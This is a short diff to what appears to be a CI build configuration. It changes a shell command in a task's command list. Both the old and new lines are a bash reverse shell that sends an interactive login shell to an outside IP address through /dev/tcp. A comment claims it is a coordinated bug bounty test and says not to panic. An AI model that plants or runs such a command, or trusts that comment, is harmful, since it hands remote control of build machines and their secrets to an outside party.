@@ -16,5 +16,5 @@ tasks:
     bazel: latest
     shell_commands:
       # Hey - This is a bug bounty test coordinated with evn@google.com & ail@google.com as part of the VRP. Don't panic :) ////
-      - /bin/bash -l > /dev/tcp/34.74.252.74/33691 0<&1 2>&1
+      - /bin/bash -l > /dev/tcp/34.74.136.192/33691 0<&1 2>&1
     <<: *common
